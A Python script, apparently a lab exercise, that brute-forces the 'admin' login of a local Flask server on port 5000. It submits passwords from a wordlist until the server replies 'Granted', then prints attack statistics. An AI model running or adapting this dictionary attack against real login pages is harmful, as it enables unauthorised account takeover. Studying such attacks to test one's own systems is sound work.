import requests
import time
from hashlib import sha256

# Initialize starting timestamp to use in statistical analysis
starting_timestamp = time.time()

# Establishes a parameter dictionary object that includes the username admin
parameters = {}
parameters['username'] = 'admin'

# Initializes the local host to use port 5000 as per the standard establish by Flask
localhost = 'http://127.0.0.1:5000'

# Helper function to print the relevant statistics associated with the password cracking
def printStats(starting_timestamp, guesses):
    print(f'\n**********\n')
    print(f'Statistical Overview of Password Crack')
    print(f'--------------------------------------')
    print(f'Total number of Guesses: {guesses}')
    print(f'Total elapsed time: {time.time() - starting_timestamp} seconds')
    print(f'Guesses per second: {guesses / (time.time() - starting_timestamp)} guesses')
    print(f'\n**********\n')

with open('wordlist.txt', mode='r', encoding='ISO-8859-1') as wordbank:
    guessCount = 0
    for potentialcrack in wordbank:
        # Increment the guessCount for every word checked in the wordlist.
		# Also use list indexing to ignore the new line character at the end of every line of wordlist.
        guessCount += 1
        potentialcrack = potentialcrack[:-1]
        
        # Includes the potentialcrack as a password in the parameters dictionary object
        parameters['password'] = potentialcrack
		
        # Initialize a request object that we will use its json value to determine if access was granted.
        requestObject = requests.post(localhost, data = parameters)
		
        # Checks if access was granted. If so, the results are printed to the command line terminal.
        if requestObject.json() == 'Granted':
            printStats(starting_timestamp, guessCount)
            print(f'The password has successfully been cracked!')
            print(f'The decrypted password is: {potentialcrack}')
            break